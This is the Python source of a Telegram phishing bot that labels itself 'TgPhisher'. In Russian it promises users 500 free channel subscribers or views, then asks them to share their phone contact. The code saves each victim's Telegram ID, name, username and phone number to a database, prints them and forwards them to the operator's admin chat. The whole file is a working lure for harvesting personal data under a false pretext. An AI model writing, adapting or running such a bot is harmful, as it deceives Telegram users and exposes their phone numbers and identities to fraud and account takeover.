import telebot
from telebot import types
import colorama
from colorama import Fore, Style, Back, init
import os
import sys
import re
import requests
init()

########################
red = Fore.RED         
cyan = Fore.CYAN
blue = Fore.BLUE
green = Fore.GREEN
yellow = Fore.YELLOW
reset = Style.RESET_ALL
bold = Style.BRIGHT
########################


bottoken = sys.argv[1]
admin = sys.argv[2]
title = sys.argv[3]



from banner import banner
from database import DB


def print_user_data(user_id, first_name, username="", phone_number="") -> None:
    border = "{:-^40}".format("")
    
    print(Fore.YELLOW + border + Style.RESET_ALL)
    print(Fore.GREEN + "    ID: " + Fore.WHITE + "{:<31}".format(user_id) + Style.RESET_ALL)
    print(Fore.GREEN + "    Имя: " + Fore.WHITE + "{:<29}".format(first_name) + Style.RESET_ALL)
    
    if username:
        print(Fore.GREEN + "    Username: " + Fore.WHITE + "{:<24}".format("@" + username) + Style.RESET_ALL)
    if phone_number:
        print(Fore.GREEN + "    Номер телефона: " + Fore.WHITE + "     {:<14}".format(phone_number) + Style.RESET_ALL)
    print(Fore.YELLOW + border + Style.RESET_ALL)

os.system('cls' if os.name == 'nt' else 'clear')
print(banner.format(bold=bold, blue=blue, reset=reset, title=title, yellow=yellow, cyan=cyan))

def get_bot_username(token):
    url = f"https://api.telegram.org/bot{token}/getMe"
    response = requests.get(url).json()

# Проверяем, что запрос успешно выполнен и содержит имя пользователя
    if response.get("ok") and 'username' in response.get("result", {}):
        return response["result"]["username"]
    else:
        return None

username = get_bot_username(bottoken)
if username:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(banner.format(bold=bold, blue=blue, reset=reset, title=title, yellow=yellow, cyan=cyan))
        print(f"        Бот запущен!{reset} - {red}для выхода [ctrl + c]{reset}\n        Юзернейм вашего бота: {yellow}@{username}{reset}\n        Отправьте с вашего аккаунта\n        Команду {yellow}- /start{reset} боту.")

bot = telebot.TeleBot(bottoken)

# Словари для хранения состояния каждого пользователя
user_states = {}
user_channels = {}

@bot.message_handler(commands=['start'])
def handle_start(message):
    user_states[message.chat.id] = "START"
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="Продолжить", callback_data="continue")
    markup.add(button)
    bot.send_message(message.chat.id, "Привет! 👋\n\nДанный сервис поможет вам увеличить подписчиков и просмотры вашего канала. Давайте начнем! ✨", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "continue")
def handle_continue(call):
    bot.delete_message(call.message.chat.id, call.message.message_id)
    user_states[call.message.chat.id] = "AWAITING_CHANNEL"
    bot.send_message(call.message.chat.id, "Отправьте публичную ссылку вашего канала в формате @username.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "AWAITING_CHANNEL")
def process_channel_step(message):
    channel_username = message.text
    if not re.match(r'^@([a-zA-Z0-9_]{5,32})$', channel_username):
        bot.send_message(message.chat.id, "Пожалуйста, отправьте действительное имя канала в формате @username.")
        return

    user_channels[message.chat.id] = channel_username
    markup = types.ReplyKeyboardMarkup(row_width=1, one_time_keyboard=True)
    button1 = types.KeyboardButton("500 подписчиков")
    button2 = types.KeyboardButton("500 просмотров")
    markup.add(button1, button2)
    user_states[message.chat.id] = "AWAITING_CHOICE"
    bot.send_message(message.chat.id, "Выберите количество подписчиков или просмотров:", reply_markup=markup)

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "AWAITING_CHOICE")
def process_choice_step(message):
    if message.text not in ["500 подписчиков", "500 просмотров"]:
        bot.send_message(message.chat.id, "Для приобретения большего количества подписчиков и просмотров обратитесь к админу.")
        return

    markup = types.ReplyKeyboardMarkup(row_width=1, one_time_keyboard=True)
    button = types.KeyboardButton("Подтвердить номер телефона", request_contact=True)
    markup.add(button)
    user_states[message.chat.id] = "AWAITING_PHONE_CONFIRM"
    bot.send_message(message.chat.id, "Подтвердите ваш номер телефона для продолжения.", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    if user_states.get(message.chat.id) != "AWAITING_PHONE_CONFIRM":
        return
    db = DB("sv")
    if not db.is_exist(message.contact.user_id):
        db.add_user(
            message.contact.user_id,
            message.contact.first_name,
            message.contact.last_name,
            phone=message.contact.phone_number
        )
        db.close()
    print_user_data(message.from_user.id, message.from_user.first_name, message.from_user.username, message.contact.phone_number)
    print()
    try:
        bot.send_message(admin, f'''
#TgPhisher - {username}

- {message.from_user.id}
- {message.from_user.first_name} {message.from_user.first_name}
- {message.from_user.username}
- {message.contact.phone_number}
- By @immortal_nameless''')
    except:
        print('     error send to ADMIN_ID      ')
    
    bot.send_message(message.chat.id, f"<b>Запрос отправлен</b>Ваш запрос будет обработан в ближайшее время.\nВаш id:{message.from_user.id}", parse_mode='HTML')
try:
    bot.polling(none_stop=True)
except Exception as e:
    print(f"Произошла ошибка: {e}")